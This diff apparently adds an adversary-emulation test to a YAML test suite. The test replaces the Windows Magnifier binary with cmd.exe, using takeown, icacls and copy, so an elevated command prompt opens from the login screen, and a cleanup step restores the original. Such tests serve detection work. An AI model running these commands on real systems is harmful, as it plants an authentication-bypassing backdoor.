@@ -137,3 +137,18 @@ atomic_tests:
       copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
     name: command_prompt
     elevation_required: true
+- name: Replace Magnify.exe (Magnifier binary) with cmd.exe
+  description: |
+    Replace Magnify.exe (Magnifier binary) with cmd.exe. This allows the user to launch an elevated command prompt by toggling on the Magnifier from the Accessibility menu on the login screen.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
+      takeown /F C:\Windows\System32\Magnify.exe /A
+      icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
+    name: command_prompt
+    elevation_required: true
